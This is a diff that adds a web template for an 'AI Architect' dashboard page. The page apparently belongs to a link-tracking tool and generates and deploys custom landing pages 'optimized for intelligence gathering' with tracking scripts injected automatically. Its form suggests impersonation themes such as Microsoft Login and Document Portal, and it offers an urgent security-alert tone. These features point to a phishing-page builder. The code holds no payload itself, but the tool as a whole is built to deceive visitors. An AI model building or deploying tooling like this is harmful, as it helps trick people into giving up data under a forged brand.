@@ -1,0 +1,153 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="row" style="display: flex; gap: 30px; flex-wrap: wrap;">
+    <!-- Left: Configuration -->
+    <div style="flex: 1; min-width: 300px;">
+        <div class="card">
+            <h2 style="margin-bottom: 20px;"><i class="fas fa-drafting-compass"></i> AI Architect</h2>
+            <p style="color: var(--text-muted); margin-bottom: 20px;">
+                Generate high-converting, custom landing pages optimized for intelligence gathering.
+                The AI will inject tracking scripts automatically.
+            </p>
+
+            <form id="architectForm">
+                <div class="form-group" style="margin-bottom: 15px;">
+                    <label>Target Link</label>
+                    <select id="link_id" name="link_id" required>
+                        {% for link in links %}
+                        <option value="{{ link.id }}">{{ link.slug }} -> {{ link.destination }}</option>
+                        {% endfor %}
+                    </select>
+                </div>
+
+                <div class="form-group" style="margin-bottom: 15px;">
+                    <label>Industry / Use Case</label>
+                    <input type="text" id="industry" name="industry"
+                        placeholder="e.g. Corporate HR, Microsoft Login, Givaway, Document Portal" required>
+                </div>
+
+                <div class="form-group" style="margin-bottom: 15px;">
+                    <label>Brand Name / Title</label>
+                    <input type="text" id="brand" name="brand" placeholder="e.g. SecurePortal, HR Connect">
+                </div>
+
+                <div class="form-group" style="margin-bottom: 15px;">
+                    <label>Color Theme</label>
+                    <div style="display: flex; gap: 10px;">
+                        <input type="color" id="color_primary" name="color_primary" value="#007bff"
+                            style="height: 40px; flex:1;">
+                        <input type="color" id="color_bg" name="color_bg" value="#ffffff" style="height: 40px; flex:1;">
+                    </div>
+                </div>
+
+                <div class="form-group" style="margin-bottom: 20px;">
+                    <label>Tone</label>
+                    <select id="tone" name="tone">
+                        <option value="professional">Professional / Corporate</option>
+                        <option value="urgent">Urgent / Security Alert</option>
+                        <option value="friendly">Friendly / Welcome</option>
+                        <option value="minimal">Minimal / Clean</option>
+                    </select>
+                </div>
+
+                <button type="submit" class="btn" style="width: 100%;">
+                    <i class="fas fa-magic"></i> Generate Template
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Right: Preview -->
+    <div style="flex: 2; min-width: 350px;">
+        <div class="card" style="height: 100%; display: flex; flex-direction: column;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                <h5>Live Preview</h5>
+                <div style="display: flex; gap: 10px;">
+                    <button class="btn-sm btn-outline" id="saveBtn" style="display: none;" onclick="saveTemplate()">
+                        <i class="fas fa-save"></i> Save & Deploy
+                    </button>
+                </div>
+            </div>
+
+            <div id="loading" style="display: none; text-align: center; padding: 50px;">
+                <i class="fas fa-circle-notch fa-spin" style="font-size: 2rem; color: var(--accent);"></i>
+                <p style="margin-top: 15px; color: var(--text-muted);">AI is architecting your landing page...</p>
+            </div>
+
+            <iframe id="previewFrame"
+                style="width: 100%; flex: 1; border: 1px solid var(--glass-border); border-radius: 8px; background: #fff;"></iframe>
+
+            <textarea id="generatedHtml" style="display: none;"></textarea>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('architectForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const btn = e.target.querySelector('button');
+        const loading = document.getElementById('loading');
+        const frame = document.getElementById('previewFrame');
+        const saveBtn = document.getElementById('saveBtn');
+
+        btn.disabled = true;
+        loading.style.display = 'block';
+        frame.style.display = 'none';
+        saveBtn.style.display = 'none';
+
+        const formData = new FormData(e.target);
+
+        try {
+            const res = await fetch('/dashboard/architect/generate', {
+                method: 'POST',
+                body: formData
+            });
+            const data = await res.json();
+
+            if (data.html) {
+                document.getElementById('generatedHtml').value = data.html;
+
+                // Render in Iframe
+                const blob = new Blob([data.html], { type: 'text/html' });
+                frame.src = URL.createObjectURL(blob);
+
+                frame.style.display = 'block';
+                saveBtn.style.display = 'inline-flex';
+            } else {
+                alert('Error generating template: ' + (data.error || 'Unknown'));
+            }
+        } catch (err) {
+            alert('Request failed: ' + err);
+        } finally {
+            loading.style.display = 'none';
+            btn.disabled = false;
+        }
+    });
+
+    async function saveTemplate() {
+        const linkId = document.getElementById('link_id').value;
+        const html = document.getElementById('generatedHtml').value;
+
+        if (!html) return;
+
+        const formData = new FormData();
+        formData.append('link_id', linkId);
+        formData.append('html', html);
+
+        if (confirm('This will overwrite any existing custom landing page for this link. Continue?')) {
+            const res = await fetch('/dashboard/architect/save', {
+                method: 'POST',
+                body: formData
+            });
+            const data = await res.json();
+            if (data.success) {
+                alert('Landing page deployed successfully!');
+                window.location.href = '/dashboard';
+            } else {
+                alert('Error saving: ' + data.error);
+            }
+        }
+    }
+</script>
+{% endblock %}
